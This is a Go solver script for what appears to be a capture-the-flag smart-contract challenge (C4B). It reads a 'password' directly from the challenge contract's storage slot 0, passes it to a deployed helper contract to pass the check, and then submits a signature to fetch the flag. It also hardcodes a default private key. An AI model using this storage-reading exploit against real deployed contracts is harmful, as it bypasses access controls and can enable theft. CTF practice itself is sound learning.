package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"time"

	"github.com/ethereum/go-ethereum/accounts"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/rekkusu/c4b-solver/contract"
)

//go:generate abigen --sol SolveC4B.sol --pkg contract --out contract/solve_c4b.go

var (
	API_ENDPOINT = ""
)

type ProblemInfo struct {
	DeployAddress string `json:"deploy_address"`
	ABI           struct {
		Manager   string `json:"manager"`
		Challenge string `json:"challenge"`
	} `json:"abi"`
}

func getProblemInfo() ProblemInfo {
	res, err := http.Get(API_ENDPOINT + "/problem")
	if err != nil {
		log.Fatal(err)
	}

	var info ProblemInfo
	if err = json.NewDecoder(res.Body).Decode(&info); err != nil {
		log.Fatal(err)
	}

	return info
}

func getFlag(privkey *ecdsa.PrivateKey) (string, error) {
	pubkey := privkey.Public()
	pubkeyECDSA := pubkey.(*ecdsa.PublicKey)
	myAddress := crypto.PubkeyToAddress(*pubkeyECDSA)

	hashtext := accounts.TextHash([]byte("Did you enjoy this challenge?\n" + myAddress.String()))
	sig, err := crypto.Sign(hashtext, privkey)
	if err != nil {
		return "", err
	}

	data := map[string]interface{}{}
	data["signature"] = common.ToHex(sig)
	data["address"] = myAddress.String()

	sendData, err := json.Marshal(data)
	res, err := http.Post(API_ENDPOINT+"/submit", "application/json", bytes.NewBuffer(sendData))
	if err != nil {
		return "", err
	}

	var result struct {
		Error string `json:"error"`
		Flag  string `json:"flag"`
	}
	json.NewDecoder(res.Body).Decode(&result)
	if res.StatusCode != 200 {
		log.Fatalf("%d %s", res.StatusCode, result.Error)
	}

	return result.Flag, nil
}

func getGasPrice(client *ethclient.Client) (*big.Int, error) {
	gasPrice, err := client.SuggestGasPrice(context.Background())
	if err != nil {
		return nil, err
	}
	gasPrice.Mul(gasPrice, big.NewInt(10))
	return gasPrice, nil
}

func deployChallenge(client *ethclient.Client, privkey *ecdsa.PrivateKey, managerAddress common.Address) (<-chan common.Address, error) {
	pubkey := privkey.Public()
	pubkeyECDSA := pubkey.(*ecdsa.PublicKey)
	myAddress := crypto.PubkeyToAddress(*pubkeyECDSA)

	nonce, err := client.PendingNonceAt(context.Background(), myAddress)
	if err != nil {
		log.Fatal(err)
	}

	gasPrice, err := getGasPrice(client)
	if err != nil {
		log.Fatal(err)
	}

	transactor := bind.NewKeyedTransactor(privkey)
	transactor.Nonce = big.NewInt(int64(nonce))
	transactor.Value = big.NewInt(int64(0))
	transactor.GasLimit = uint64(300000)
	transactor.GasPrice = gasPrice

	manager, err := contract.NewChallengeManager(managerAddress, client)
	if err != nil {
		return nil, err
	}

	ch := make(chan *contract.ChallengeManagerChallengeDeployed)
	manager.WatchChallengeDeployed(&bind.WatchOpts{}, ch, []common.Address{myAddress})

	transaction, err := manager.Deploy(transactor, myAddress)
	if err != nil {
		return nil, err
	}
	log.Printf("Send transaction (ChallengeManager.deploy): %s\n", transaction.Hash().String())

	deployedAddress := make(chan common.Address)
	go func() {
		for {
			event := <-ch
			if event.Player == myAddress {
				deployedAddress <- event.Challenge
				break
			}
		}
	}()

	return deployedAddress, nil
}

func solveC4B(client *ethclient.Client, privkey *ecdsa.PrivateKey, c4b common.Address, solver *contract.SolveC4B) error {
	pubkey := privkey.Public()
	pubkeyECDSA := pubkey.(*ecdsa.PublicKey)
	myAddress := crypto.PubkeyToAddress(*pubkeyECDSA)

	data, err := client.StorageAt(context.Background(), c4b, common.HexToHash("0x0"), nil)
	if err != nil {
		return err
	}

	log.Printf("storage[0]: %s\n", common.ToHex(data))

	//_success[  password(8) ][  player(20)                          ]
	//0000000198b157f76c435f8ed7221b024b804bc430f3f8952bf9581b99c8484e
	var password [8]byte
	copy(password[:], data[4:12])

	nonce, err := client.PendingNonceAt(context.Background(), myAddress)
	if err != nil {
		log.Fatal(err)
	}

	gasPrice, err := getGasPrice(client)
	if err != nil {
		log.Fatal(err)
	}

	transactor := bind.NewKeyedTransactor(privkey)
	transactor.Nonce = big.NewInt(int64(nonce))
	transactor.From = myAddress
	transactor.Value = big.NewInt(int64(0))
	transactor.GasPrice = gasPrice
	transactor.GasLimit = uint64(500000)

	tx, err := solver.Solve(transactor, password)
	if err != nil {
		return err
	}

	log.Printf("Send transaction (SolveC4B.Solve): %s\n", tx.Hash().String())

	return nil
}

func deploySolver(client *ethclient.Client, privkey *ecdsa.PrivateKey, chalAddress common.Address) (*contract.SolveC4B, error) {
	pubkey := privkey.Public()
	pubkeyECDSA := pubkey.(*ecdsa.PublicKey)
	myAddress := crypto.PubkeyToAddress(*pubkeyECDSA)

	nonce, err := client.PendingNonceAt(context.Background(), myAddress)
	if err != nil {
		return nil, err
	}

	gasPrice, err := client.SuggestGasPrice(context.Background())
	if err != nil {
		return nil, err
	}

	transactor := bind.NewKeyedTransactor(privkey)
	transactor.Nonce = big.NewInt(int64(nonce))
	transactor.From = myAddress
	transactor.Value = big.NewInt(int64(0))
	transactor.GasPrice = gasPrice
	transactor.GasLimit = uint64(500000)

	addr, tx, instance, err := contract.DeploySolveC4B(transactor, client, chalAddress)
	if err != nil {
		return nil, err
	}
	log.Printf("Sent SolveC4B at %s\n", tx.Hash().String())

	log.Printf("Deployed SolveC4B at %s\n", addr.String())

	return instance, nil
}

func main() {
	host, ok := os.LookupEnv("CTF4B_HOST")
	if !ok {
		host = "localhost"
	}

	port, ok := os.LookupEnv("CTF4B_PORT")
	if !ok {
		port = "8000"
	}

	API_ENDPOINT = fmt.Sprintf("http://%s:%s", host, port)

	rpcurl, ok := os.LookupEnv("C4B_RPCURL")
	if !ok {
		rpcurl = "ws://localhost:7545"
	}

	privKeyString, ok := os.LookupEnv("C4B_PRIVKEY")
	if !ok {
		privKeyString = "b75d926c45879d8990b99d10316e3815486cd84ea176eb0ca6d5b15a7d571c25"
	}

	ethcli, err := ethclient.Dial(rpcurl)
	if err != nil {
		log.Fatal(err)
	}

	privkey, err := crypto.HexToECDSA(privKeyString)
	if err != nil {
		log.Fatal(err)
	}
	pubkey := privkey.Public()
	pubkeyECDSA := pubkey.(*ecdsa.PublicKey)
	myAddress := crypto.PubkeyToAddress(*pubkeyECDSA)

	info := getProblemInfo()
	managerAddress := common.HexToAddress(info.DeployAddress)
	chChalAddress, err := deployChallenge(ethcli, privkey, managerAddress)
	if err != nil {
		log.Fatal(err)
	}

	chalAddress := <-chChalAddress
	log.Printf("Deployed C4B at %s\n", chalAddress.String())

	solver, err := deploySolver(ethcli, privkey, chalAddress)
	if err != nil {
		log.Fatal(err)
	}

	chal, err := contract.NewC4B(chalAddress, ethcli)
	if err != nil {
		log.Fatal(err)
	}

	err = solveC4B(ethcli, privkey, chalAddress, solver)
	if err != nil {
		log.Fatal(err)
	}

	chCheckPassed := make(chan *contract.C4BCheckPassed)
	sub, err := chal.WatchCheckPassed(&bind.WatchOpts{}, chCheckPassed, []common.Address{myAddress})
	if err != nil {
		log.Fatal(err)
	}
	defer sub.Unsubscribe()

	check := <-chCheckPassed
	log.Printf("CheckPassed: %s\n", check.Player.String())

	log.Println("Wait 10 seconds...")
	time.Sleep(10 * time.Second)

	result, err := chal.Success(&bind.CallOpts{})
	log.Printf("Call C4B.success: %v\n", result)

	flag, err := getFlag(privkey)
	if err != nil {
		log.Fatal(err)
	}

	log.Println(flag)
}
